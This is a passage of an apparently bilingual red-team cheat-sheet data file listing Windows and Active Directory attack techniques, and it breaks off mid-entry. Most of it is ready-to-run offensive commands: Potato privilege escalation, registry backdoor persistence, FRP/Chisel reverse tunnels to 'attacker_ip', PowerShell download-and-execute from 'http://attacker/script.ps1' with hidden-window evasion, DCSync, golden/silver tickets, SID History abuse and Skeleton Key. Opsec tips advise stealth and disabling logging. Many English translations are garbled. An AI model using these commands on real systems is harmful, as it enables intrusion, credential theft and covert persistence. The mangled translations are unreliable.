      exploitation: { zh: '利用流程：1) 启动Responder或ntlmrelayx监听；2) 诱导目标机器发起认证；3) 中继认证到目标服务；4) 获取访问权限或执行操作。', en: 'Exploitation workflow: 1) Start Responder or ntlmrelayx listener; 2) Coerce the target to authenticate; 3) Relay the authentication to the target service; 4) Gain access or execute operations.' },
      mitigation: { zh: '防御措施：1) 启用SMB签名；2) 禁用NTLM认证；3) 启用Extended Protection for Authentication；4) 监控异常认证行为。', en: 'Defensemeasures: 1) EnableSMBSignature; 2) DisableNTLMAuthentication; 3) EnableExtended Protection for Authentication; 4) MonitoringExceptionAuthenticationbehavior.' },
      difficulty: 'advanced'
    }
  },

  // ==================== 权限提升 ====================
  {
    id: 'privilege-token',
    name: { zh: '令牌窃取与模拟', en: 'Token Theft & Impersonation' },
    description: { zh: '窃取和模拟Windows访问令牌', en: 'Steal and impersonate Windows access tokens' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    subCategory: { zh: '令牌操作', en: 'Token Manipulation' },
    tags: ['token', 'privilege', 'impersonation', 'windows'],
    prerequisites: [{ zh: '已获得目标机器权限', en: 'Already have access to the target machine' }, { zh: 'SeImpersonatePrivilege权限', en: 'SeImpersonatePrivilegePermission' }, { zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: '列出令牌', en: 'ListToken' },
        command: 'mimikatz.exe "privilege::debug" "token::list" "exit"',
        description: { zh: '列出系统中所有可用令牌', en: 'List all available tokens on the system' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: '窃取令牌', en: 'StealToken' },
        command: 'mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"',
        description: { zh: '窃取指定用户的令牌', en: 'StealspecifiedUsers Token' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: 'JuicyPotato攻击', en: 'JuicyPotatoAttack' },
        command: 'JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}',
        description: { zh: 'JuicyPotato提权（需要SeImpersonatePrivilege）', en: 'JuicyPotato Privilege Escalation(requiresSeImpersonatePrivilege)' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'JuicyPotato.exe', explanation: { zh: 'DCOM DCE/RPC本地提权工具', en: 'DCOM DCE/RPCLocalPrivilege escalationTools' }, type: 'command' },
          { part: '-l', explanation: { zh: '监听端口', en: 'listeningPort' }, type: 'parameter' },
          { part: '-p', explanation: { zh: '要执行的程序', en: 'NeedExecute Program' }, type: 'parameter' },
          { part: '-c', explanation: 'CLSID', type: 'parameter' }
        ]
      },
      {
        title: 'PrintSpoofer',
        command: 'PrintSpoofer.exe -i -c cmd',
        description: { zh: 'PrintSpoofer提权', en: 'PrintSpoofer Privilege Escalation' },
        platform: 'windows'
      },
      {
        title: 'GodPotato',
        command: 'GodPotato.exe -cmd "cmd /c whoami"',
        description: { zh: 'GodPotato提权，支持更多Windows版本', en: 'GodPotato privilege escalation — supports a wider range of Windows versions' },
        platform: 'windows'
      }
    ],
    edrBypass: [
      {
        title: 'RoguePotato',
        command: 'RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"',
        description: { zh: 'RoguePotato，绕过更多限制', en: 'RoguePotato — bypasses additional restrictions' }
      }
    ],
    analysis: { zh: '令牌窃取成功后可以模拟高权限用户身份执行操作。', en: 'After a successful token theft, you can impersonate a high-privilege user to execute operations.' },
    opsecTips: [{ zh: 'Potato系列工具利用DCOM机制', en: 'Potato family tools exploit the DCOM mechanism' }, { zh: '需要SeImpersonatePrivilege权限', en: 'requiresSeImpersonatePrivilegePermission' }, { zh: '不同Windows版本需要不同的CLSID', en: 'Different Windows versions require different CLSIDs' }],
    tutorial: {
      overview: { zh: 'Windows访问令牌(Access Token)包含用户身份和权限信息，攻击者可以窃取高权限用户的令牌来提升权限。', en: 'Windows Access Tokens contain user identity and privilege information; an attacker can steal a high-privilege user\'s token to escalate privileges.' },
      vulnerability: { zh: 'Windows允许进程模拟其他用户的令牌，如果服务账户具有SeImpersonatePrivilege权限，攻击者可以利用此权限获取SYSTEM权限。', en: 'Windows allows processes to impersonate other users\' tokens. If a service account has SeImpersonatePrivilege, an attacker can leverage it to obtain SYSTEM privileges.' },
      exploitation: { zh: '利用流程：1) 获取SeImpersonatePrivilege权限的服务账户；2) 使用Potato系列工具触发SYSTEM进程连接；3) 窃取SYSTEM令牌；4) 以SYSTEM权限执行命令。', en: 'Exploitation workflow: 1) Obtain a service account with SeImpersonatePrivilege; 2) Use a Potato family tool to trigger a SYSTEM process connection; 3) Steal the SYSTEM token; 4) Execute commands as SYSTEM.' },
      mitigation: { zh: '防御措施：1) 移除不必要的服务账户SeImpersonatePrivilege权限；2) 监控令牌操作；3) 部署EDR检测异常行为；4) 及时更新系统补丁。', en: 'Defenses: 1) Remove unnecessary SeImpersonatePrivilege from service accounts; 2) Monitor token manipulation; 3) Deploy EDR to detect anomalous behavior; 4) Apply system patches promptly.' },
      difficulty: 'advanced'
    }
  },

  // ==================== 权限维持 ====================
  {
    id: 'persistence-registry',
    name: { zh: '注册表持久化', en: 'Registry Persistence' },
    description: { zh: '通过注册表实现权限维持', en: 'throughRegistryImplementPersistence' },
    category: { zh: '权限维持', en: 'Persistence' },
    subCategory: { zh: '注册表', en: 'Registry' },
    tags: ['persistence', 'registry', 'windows', 'autorun'],
    prerequisites: [{ zh: '已获得目标机器权限', en: 'Already have access to the target machine' }, { zh: '管理员权限', en: 'ManagementMemberPermission' }, { zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: 'Run键持久化', en: 'Run key persistence' },
        command: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Backdoor /t REG_SZ /d "C:\\Users\\Public\\backdoor.exe" /f',
        description: { zh: '添加Run键实现开机自启', en: 'Add a Run key for auto-start on boot' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: 'RunOnce键', en: 'RunOnce key' },
        command: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Backdoor /t REG_SZ /d "C:\\backdoor.exe" /f',
        description: { zh: 'RunOnce键，执行一次后删除', en: 'RunOnce key — executes once then deletes itself' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: 'Winlogon Helper',
        command: 'reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,C:\\backdoor.exe" /f',
        description: { zh: '修改Userinit实现持久化', en: 'ModifyUserinitImplementPersistence' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: '服务持久化', en: 'Service Persistence' },
        command: 'sc create Backdoor binPath= "C:\\backdoor.exe" start= auto',
        description: { zh: '创建服务实现持久化', en: 'CreateServiceImplementPersistence' },
        platform: 'windows',
        requiresAdmin: true
      }
    ],
    edrBypass: [
      {
        title: { zh: '隐藏注册表键', en: 'Hidden registry key' },
        command: 'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x00" /v Backdoor /t REG_SZ /d "C:\\backdoor.exe" /f',
        description: { zh: '使用空字节隐藏注册表键', en: 'Use a null byte to hide the registry key' }
      }
    ],
    analysis: { zh: '注册表持久化会在系统启动或用户登录时执行恶意程序。', en: 'Registry PersistenceWill in SystemStart or UsersLoginWhenExecuteMaliciousProgram.' },
    opsecTips: [{ zh: 'Run键是最常见的持久化方式，容易被检测', en: 'Run keys are the most common persistence method and are easily detected' }, { zh: '考虑使用更隐蔽的方式', en: 'Consider using stealthier methods' }, { zh: '定期检查注册表异常项', en: 'Regularly check for anomalous registry entries' }],
    tutorial: {
      overview: { zh: 'Windows注册表提供了多种持久化机制，攻击者可以在系统启动或用户登录时自动执行恶意代码。', en: 'The Windows Registry provides multiple persistence mechanisms; attackers can auto-execute malicious code at system startup or user logon.' },
      vulnerability: { zh: 'Windows注册表中的多个键值可以在特定时机自动执行程序，这是系统设计功能，但可被攻击者滥用。', en: 'Multiple registry keys can automatically execute programs at specific events — this is a system design feature but can be abused by attackers.' },
      exploitation: { zh: '利用流程：1) 获取管理员权限；2) 选择持久化位置；3) 添加恶意程序路径；4) 等待系统重启或用户登录；5) 恶意程序自动执行。', en: 'Exploitation workflow: 1) Obtain administrator privileges; 2) Choose a persistence location; 3) Add a malicious program path; 4) Wait for system restart or user logon; 5) The malicious program executes automatically.' },
      mitigation: { zh: '防御措施：1) 监控注册表关键键值变化；2) 使用白名单限制程序执行；3) 定期审计持久化项；4) 部署EDR检测异常行为。', en: 'Defenses: 1) Monitor changes to critical registry keys; 2) Use application whitelisting to restrict execution; 3) Regularly audit persistence entries; 4) Deploy EDR to detect anomalous behavior.' },
      difficulty: 'intermediate'
    }
  },

  // ==================== 隧道代理 ====================
  {
    id: 'tunnel-frp',
    name: { zh: 'FRP内网穿透', en: 'FRP Intranet Tunneling' },
    description: { zh: '使用FRP建立内网穿透隧道', en: 'UseFRPEstablishInternal network tunnelingtunnel' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: { zh: 'TCP隧道', en: 'TCP Tunnel' },
    tags: ['frp', 'tunnel', 'proxy', 'nat'],
    prerequisites: [{ zh: '公网服务器', en: 'Public networkServer' }, { zh: '内网机器可访问公网', en: 'Internal networkMachineCanAccessPublic network' }, { zh: 'FRP工具', en: 'FRPTools' }],
    execution: [
      {
        title: { zh: '服务端配置', en: 'Server-SideConfiguration' },
        command: '[common]\nbind_port = 7000',
        description: { zh: 'FRP服务端配置文件frps.ini', en: 'FRPServer-SideConfiguration Filefrps.ini' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'bind_port', explanation: { zh: '服务端监听端口', en: 'Server-SidelisteningPort' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '客户端配置', en: 'ClientConfiguration' },
        command: '[common]\nserver_addr = attacker_ip\nserver_port = 7000\n\n[rdp]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 3389\nremote_port = 3389',
        description: { zh: 'FRP客户端配置文件frpc.ini', en: 'FRPClientConfiguration Filefrpc.ini' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'server_addr', explanation: { zh: '服务端IP', en: 'Server-SideIP' }, type: 'parameter' },
          { part: 'local_port', explanation: { zh: '本地端口', en: 'LocalPort' }, type: 'parameter' },
          { part: 'remote_port', explanation: { zh: '远程端口', en: 'RemotePort' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '启动服务端', en: 'Start the server side' },
        command: './frps -c frps.ini',
        description: { zh: '启动FRP服务端', en: 'StartFRPServer-Side' },
        platform: 'linux'
      },
      {
        title: { zh: '启动客户端', en: 'StartClient' },
        command: 'frpc.exe -c frpc.ini',
        description: { zh: '启动FRP客户端', en: 'StartFRPClient' },
        platform: 'windows'
      }
    ],
    analysis: { zh: 'FRP可以建立TCP隧道，将内网服务映射到公网。', en: 'FRPcanEstablishTCP Tunnel, will Internal networkServicemapping to Public network.' },
    opsecTips: [{ zh: 'FRP流量可能被检测', en: 'FRPTrafficPossible by Detection' }, { zh: '考虑使用加密传输', en: 'Consider using encrypted transport' }, { zh: '注意隐藏进程', en: 'NoteHiddenProcess' }],
    tutorial: {
      overview: { zh: 'FRP是一款高性能的反向代理应用，可以将内网服务暴露到公网。', en: 'FRP is a high-performance reverse proxy that can expose internal network services to the public internet.' },
      vulnerability: { zh: '内网机器可以访问公网时，攻击者可以建立隧道将内网服务映射出去。', en: 'When internal machines can reach the internet, an attacker can establish a tunnel to map internal services outward.' },
      exploitation: { zh: '利用流程：1) 在公网服务器部署FRP服务端；2) 在内网机器运行FRP客户端；3) 建立隧道连接；4) 通过隧道访问内网服务。', en: 'Exploitationworkflow: 1) in Public networkServerDeploymentFRPServer-Side; 2) in Internal networkMachineRunFRPClient; 3) EstablishtunnelConnection; 4) throughtunnelAccessInternal networkService.' },
      mitigation: { zh: '防御措施：1) 监控异常外联流量；2) 限制出站连接；3) 部署流量分析设备；4) 禁止未授权的代理工具。', en: 'Defenses: 1) Monitor anomalous outbound traffic; 2) Restrict outbound connections; 3) Deploy traffic analysis appliances; 4) Block unauthorized proxy tools.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'tunnel-chisel',
    name: { zh: 'Chisel内网穿透', en: 'Chisel Intranet Tunneling' },
    description: { zh: '使用Chisel建立内网穿透隧道', en: 'UseChiselEstablishInternal network tunnelingtunnel' },
    category: { zh: '隧道代理', en: 'Tunneling & Proxy' },
    subCategory: { zh: 'HTTP隧道', en: 'HTTP Tunnel' },
    tags: ['chisel', 'tunnel', 'proxy', 'http'],
    prerequisites: [{ zh: '公网服务器', en: 'Public networkServer' }, { zh: '内网机器可访问公网', en: 'Internal networkMachineCanAccessPublic network' }, { zh: 'Chisel工具', en: 'ChiselTools' }],
    execution: [
      {
        title: { zh: '服务端', en: 'Server-Side' },
        command: './chisel server -p 8000 --reverse',
        description: { zh: '启动Chisel服务端', en: 'StartChiselServer-Side' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'chisel server', explanation: { zh: 'Chisel服务端模式', en: 'ChiselServer-SideMode' }, type: 'command' },
          { part: '-p 8000', explanation: { zh: '监听端口', en: 'listeningPort' }, type: 'parameter' },
          { part: '--reverse', explanation: { zh: '允许反向隧道', en: 'Allow reverse tunnels' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '反向SOCKS', en: 'Reverse SOCKS' },
        command: 'chisel.exe client attacker_ip:8000 R:socks',
        description: { zh: '建立反向SOCKS代理', en: 'EstablishReverse SOCKS Proxy' },
        platform: 'windows'
      },
      {
        title: { zh: '端口转发', en: 'Port Forwarding' },
        command: 'chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389',
        description: { zh: '端口转发', en: 'Port Forwarding' },
        platform: 'windows'
      }
    ],
    analysis: { zh: 'Chisel可以建立HTTP隧道，穿透防火墙。', en: 'Chisel can establish HTTP tunnels that punch through firewalls.' },
    opsecTips: [{ zh: 'Chisel使用HTTP协议', en: 'ChiselUseHTTPProtocol' }, { zh: '可以绑定域名伪装', en: 'canbindingDomain nameDisguise' }, { zh: '流量加密', en: 'TrafficEncryption' }],
    tutorial: {
      overview: { zh: 'Chisel是一款快速的TCP/UDP隧道工具，通过HTTP传输。', en: 'Chisel is a fast TCP/UDP tunnel tool that transports data over HTTP.' },
      vulnerability: { zh: 'HTTP隧道可以绕过防火墙限制，将内网服务暴露出去。', en: 'HTTP tunnels can bypass firewall restrictions and expose internal services.' },
      exploitation: { zh: '利用流程：1) 在公网服务器运行Chisel服务端；2) 在内网机器运行Chisel客户端；3) 建立隧道；4) 通过代理访问内网。', en: 'Exploitationworkflow: 1) in Public networkServerRunChiselServer-Side; 2) in Internal networkMachineRunChiselClient; 3) Establishtunnel; 4) throughProxyAccessInternal network.' },
      mitigation: { zh: '防御措施：1) 监控异常HTTP流量；2) 检测长连接；3) 部署流量分析。', en: 'Defenses: 1) Monitor anomalous HTTP traffic; 2) Detect long-lived connections; 3) Deploy traffic analysis.' },
      difficulty: 'beginner'
    }
  },

  // ==================== 免杀技术 ====================
  {
    id: 'evasion-powershell',
    name: { zh: 'PowerShell免杀', en: 'PowerShell Evasion' },
    description: { zh: 'PowerShell脚本免杀技术', en: 'PowerShellScriptAV evasionTechnique' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: 'PowerShell',
    tags: ['powershell', 'evasion', 'obfuscation'],
    prerequisites: [{ zh: '目标机器访问权限', en: 'TargetMachineAccessPermission' }, { zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: '编码执行', en: 'Encoded Execution' },
        command: 'powershell -enc BASE64_ENCODED_COMMAND',
        description: { zh: 'Base64编码执行', en: 'Base64 EncodingExecute' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-enc', explanation: { zh: 'Base64编码命令', en: 'Base64 EncodingCommand' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '远程加载', en: 'RemoteLoad' },
        command: 'IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")',
        description: { zh: '远程加载脚本', en: 'RemoteLoad Script' },
        platform: 'windows'
      },
      {
        title: { zh: '混淆变量名', en: 'ObfuscationVariablename' },
        command: `${1}='IEX'; ${2}='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "${1} ${2}"`,
        description: { zh: '变量名混淆', en: 'VariablenameObfuscation' },
        platform: 'windows'
      },
      {
        title: { zh: '无文件执行', en: 'no FileExecute' },
        command: 'powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\\"http://attacker/script.ps1\\")"',
        description: { zh: '隐藏窗口无配置文件执行', en: 'Execute with hidden window and no profile' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '-w hidden', explanation: { zh: '隐藏窗口', en: 'Hidden window' }, type: 'parameter' },
          { part: '-nop', explanation: { zh: '无配置文件', en: 'no Configuration File' }, type: 'parameter' }
        ]
      }
    ],
    edrBypass: [
      {
        title: { zh: '降级执行', en: 'DowngradeExecute' },
        command: 'powershell -version 2 -c "command"',
        description: { zh: '使用PowerShell v2绕过日志', en: 'UsePowerShell v2BypassLog' }
      }
    ],
    analysis: { zh: 'PowerShell免杀可以绕过杀毒软件检测执行恶意脚本。', en: 'PowerShell EvasioncanBypassAntivirusDetectionExecuteMaliciousScript.' },
    opsecTips: [{ zh: 'PowerShell日志可能记录命令', en: 'PowerShell logging may record commands' }, { zh: '考虑禁用日志', en: 'Consider disabling logging' }, { zh: '使用混淆技术', en: 'UseObfuscationTechnique' }],
    tutorial: {
      overview: { zh: 'PowerShell是Windows强大的脚本环境，攻击者可以使用各种技术绕过检测。', en: 'PowerShell is a powerful scripting environment in Windows; attackers use various techniques to bypass detection.' },
      vulnerability: { zh: 'PowerShell的灵活性和强大功能使其成为攻击者的首选工具。', en: 'PowerShell\'s flexibility and power make it a preferred tool for attackers.' },
      exploitation: { zh: '利用流程：1) 获取目标机器访问权限；2) 使用免杀技术；3) 执行恶意脚本；4) 完成攻击。', en: 'Exploitation workflow: 1) Gain access to the target machine; 2) Use AV evasion techniques; 3) Execute the malicious script; 4) Complete the attack.' },
      mitigation: { zh: '防御措施：1) 启用PowerShell日志；2) 使用约束语言模式；3) 监控异常PowerShell活动。', en: 'Defenses: 1) Enable PowerShell logging; 2) Use Constrained Language Mode; 3) Monitor anomalous PowerShell activity.' },
      difficulty: 'intermediate'
    }
  },

  // ==================== 域渗透 ====================
  {
    id: 'domain-privilege-escalation',
    name: { zh: '域内权限提升路径', en: 'Domain Privilege Escalation Path' },
    description: { zh: '利用ACL错误配置进行域权限提升', en: 'ExploitationACLErrorConfiguration perform DomainPrivilege Escalation' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: { zh: '权限提升', en: 'Privilege Escalation' },
    tags: ['acl', 'privilege', 'active-directory', 'escalation'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '普通域用户凭证', en: 'Regular domain user credentials' }, { zh: 'BloodHound分析结果', en: 'BloodHoundAnalyzeResult' }],
    execution: [
      {
        title: { zh: 'BloodHound分析', en: 'BloodHoundAnalyze' },
        command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p',
        description: { zh: '查询到域管理员的最短路径', en: 'Shortest path to Domain Admins' },
        platform: 'all'
      },
      {
        title: { zh: '查找WriteDACL', en: 'FindWriteDACL' },
        command: 'Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}',
        description: { zh: '查找WriteDACL权限', en: 'FindWriteDACLPermission' },
        platform: 'windows'
      },
      {
        title: { zh: '利用WriteDACL', en: 'ExploitationWriteDACL' },
        command: 'Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER',
        description: { zh: '添加DCSync权限', en: 'AddDCSyncPermission' },
        platform: 'windows'
      },
      {
        title: { zh: '执行DCSync', en: 'ExecuteDCSync' },
        command: 'mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"',
        description: { zh: '执行DCSync获取域管哈希', en: 'ExecuteDCSyncGet Domain Adminshash' },
        platform: 'windows'
      },
      {
        title: { zh: '查找GenericAll', en: 'FindGenericAll' },
        command: 'Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}',
        description: { zh: '查找GenericAll权限', en: 'FindGenericAllPermission' },
        platform: 'windows'
      },
      {
        title: { zh: '重置密码', en: 'ResetPassword' },
        command: 'Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)',
        description: { zh: '重置目标用户密码', en: 'ResetTargetUsersPassword' },
        platform: 'windows'
      }
    ],
    edrBypass: [
      {
        title: { zh: '隐蔽操作', en: 'Stealthyoperation' },
        command: 'Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com',
        description: { zh: '指定域控制器操作', en: 'Specify Domain Controlleroperation' }
      }
    ],
    analysis: { zh: '域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。', en: 'DomainInsideACLErrorConfiguration is common Privilege EscalationPath, canthroughBloodHoundDiscover.' },
    opsecTips: [{ zh: 'ACL修改会产生日志', en: 'ACL modifications generate logs' }, { zh: '优先使用隐蔽的权限', en: 'Prefer stealthier permission abuse' }, { zh: 'BloodHound可以发现攻击路径', en: 'BloodHoundcanDiscoverAttackPath' }],
    tutorial: {
      overview: { zh: 'Active Directory中的ACL错误配置允许低权限用户获取高权限。', en: 'ACL misconfigurations in Active Directory can allow low-privilege users to gain high privileges.' },
      vulnerability: { zh: 'AD中的ACL配置错误可能允许低权限用户修改高权限对象的属性或权限。', en: 'ACL misconfigurations in AD may allow low-privilege users to modify properties or permissions of high-privilege objects.' },
      exploitation: { zh: '利用流程：1) 使用BloodHound分析；2) 发现ACL攻击路径；3) 利用权限提升；4) 获取高权限。', en: 'Exploitationworkflow: 1) UseBloodHoundAnalyze; 2) DiscoverACLAttackPath; 3) ExploitationPrivilege Escalation; 4) ObtainHighPermission.' },
      mitigation: { zh: '防御措施：1) 定期审计ACL配置；2) 最小权限原则；3) 监控ACL修改；4) 部署异常检测。', en: 'Defenses: 1) Regularly audit ACL configurations; 2) Apply the principle of least privilege; 3) Monitor ACL modifications; 4) Deploy anomaly detection.' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'domain-cross-trust',
    name: { zh: '跨域信任攻击', en: 'Cross-Domain Trust Attack' },
    description: { zh: '利用域信任关系进行跨域攻击', en: 'ExploitationDomainTrust Relationships perform Cross-Domain Attack' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: { zh: '跨域攻击', en: 'Cross-Domain Attack' },
    tags: ['trust', 'cross-domain', 'active-directory', 'forest'],
    prerequisites: [{ zh: '已获取源域权限', en: 'already ObtainSourceDomainPermission' }, { zh: '存在域信任关系', en: 'hasDomainTrust Relationships' }, { zh: '目标域信息', en: 'TargetDomain Info' }],
    execution: [
      {
        title: { zh: '枚举信任关系', en: 'EnumerationTrust Relationships' },
        command: 'Get-NetDomainTrust',
        description: { zh: '枚举域信任关系', en: 'EnumerationDomainTrust Relationships' },
        platform: 'windows'
      },
      {
        title: { zh: '枚举森林信任', en: 'Enumerate forest trusts' },
        command: 'Get-NetForestTrust',
        description: { zh: '枚举森林信任关系', en: 'Enumerate forest trust relationships' },
        platform: 'windows'
      },
      {
        title: { zh: '跨域用户枚举', en: 'CrossDomainUser Enumeration' },
        command: 'Get-NetUser -Domain target.domain.com',
        description: { zh: '枚举目标域用户', en: 'EnumerationTargetDomain Users' },
        platform: 'windows'
      },
      {
        title: { zh: '跨域组枚举', en: 'CrossDomainGroup Enumeration' },
        command: 'Get-NetGroup -Domain target.domain.com',
        description: { zh: '枚举目标域组', en: 'EnumerationTargetDomainGroups' },
        platform: 'windows'
      },
      {
        title: { zh: 'SID History攻击', en: 'SID HistoryAttack' },
        command: 'mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"',
        description: { zh: '利用SID History跨域提权', en: 'ExploitationSID HistoryCrossDomainPrivilege escalation' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/sids', explanation: { zh: '添加目标域的SID', en: 'AddTargetDomain SID' }, type: 'parameter' },
          { part: '519', explanation: { zh: 'Enterprise Admins组的RID', en: 'Enterprise AdminsGroups RID' }, type: 'value' }
        ]
      },
      {
        title: { zh: '跨域票据', en: 'CrossDomainTicket' },
        command: 'asktgt.exe -domain target.domain.com -user Administrator -hash :HASH',
        description: { zh: '请求目标域票据', en: 'RequestTargetDomainTicket' },
        platform: 'windows'
      }
    ],
    edrBypass: [
      {
        title: { zh: '隐蔽跨域', en: 'StealthyCrossDomain' },
        command: 'Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com',
        description: { zh: '指定目标域控制器枚举', en: 'specifiedTargetDomainControllerEnumeration' }
      }
    ],
    analysis: { zh: '跨域信任攻击可以利用信任关系从低安全域向高安全域移动。', en: 'Cross-domain trust attacks leverage trust relationships to move from a lower-security domain to a higher-security domain.' },
    opsecTips: [{ zh: '跨域攻击会产生日志', en: 'Cross-domain attacks generate logs' }, { zh: 'SID History需要特殊权限', en: 'SID History requires special privileges' }, { zh: '森林信任更安全', en: 'Forest trusts are more secure' }],
    tutorial: {
      overview: { zh: '域信任关系允许跨域访问，攻击者可以利用信任关系进行横向移动。', en: 'DomainTrust RelationshipsAllowCrossDomainAccess, AttackPersoncanExploitationTrust Relationships perform Lateral Movement.' },
      vulnerability: { zh: '域信任关系可能允许攻击者从一个域访问另一个域的资源，SID History可以用于跨域提权。', en: 'Domain trust relationships may allow an attacker to access resources in another domain; SID History can be used for cross-domain privilege escalation.' },
      exploitation: { zh: '利用流程：1) 枚举信任关系；2) 分析信任类型；3) 利用信任关系；4) 跨域横向移动。', en: 'Exploitation workflow: 1) Enumerate trust relationships; 2) Analyze trust types; 3) Exploit trust relationships; 4) Perform cross-domain lateral movement.' },
      mitigation: { zh: '防御措施：1) 审计信任关系；2) 使用选择性认证；3) 监控跨域活动；4) 定期审查SID History。', en: 'Defenses: 1) Audit trust relationships; 2) Use selective authentication; 3) Monitor cross-domain activity; 4) Regularly review SID History.' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'mimikatz-advanced',
    name: { zh: 'Mimikatz高级技巧', en: 'Mimikatz Advanced Techniques' },
    description: { zh: 'Mimikatz高级凭证提取和利用技术', en: 'MimikatzAdvancedCredentialsExtract and ExploitationTechnique' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'Mimikatz',
    tags: ['mimikatz', 'credentials', 'advanced'],
    prerequisites: [{ zh: '管理员权限', en: 'ManagementMemberPermission' }, { zh: 'Mimikatz工具', en: 'MimikatzTools' }],
    execution: [
      {
        title: { zh: 'DCSync攻击', en: 'DCSync Attack' },
        command: 'lsadump::dcsync /domain:domain.com /user:Administrator',
        description: { zh: '模拟DC同步获取域管哈希', en: 'Simulate DC replication to obtain Domain Admin hashes' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'lsadump::dcsync', explanation: { zh: 'DCSync模块，模拟域控制器复制', en: 'DCSync module — simulate domain controller replication' } , type: 'command' },
          { part: '/domain:domain.com', explanation: { zh: '目标域名', en: 'TargetDomain name' } , type: 'parameter' },
          { part: '/user:Administrator', explanation: { zh: '目标用户，获取其NTLM哈希', en: 'Target user — obtain their NTLM hash' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '黄金票据生成', en: 'Golden TicketGenerate' },
        command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt',
        description: { zh: '生成黄金票据并注入', en: 'GenerateGolden Ticket and Injection' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'kerberos::golden', explanation: { zh: '黄金票据模块', en: 'Golden TicketModule' } , type: 'command' },
          { part: '/sid:S-1-5-21-xxx', explanation: { zh: '域SID', en: 'DomainSID' } , type: 'parameter' },
          { part: '/krbtgt:HASH', explanation: { zh: 'krbtgt账户NTLM哈希', en: 'krbtgtAccountNTLMhash' } , type: 'parameter' },
          { part: '/ptt', explanation: { zh: 'Pass-the-Ticket，直接注入内存', en: 'Pass-the-Ticket, DirectlyInjectionMemory' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '白银票据生成', en: 'Silver TicketGenerate' },
        command: 'kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt',
        description: { zh: '生成白银票据访问特定服务', en: 'GenerateSilver TicketAccessspecificService' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '/target:server', explanation: { zh: '目标服务器', en: 'TargetServer' } , type: 'parameter' },
          { part: '/service:cifs', explanation: { zh: '服务类型，CIFS为文件共享', en: 'ServiceType, CIFS is FileShares' } , type: 'parameter' },
          { part: '/rc4:HASH', explanation: { zh: '服务账户NTLM哈希', en: 'ServiceAccountNTLMhash' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Skeleton Key植入', en: 'Skeleton Key implantation' },
        command: 'privilege::debug\nmisc::skeleton',
        description: { zh: '植入万能密码mimikatz', en: 'Implant a skeleton key (master password) via Mimikatz' },
        platform: 'windows',
        syntaxBreakdown: [
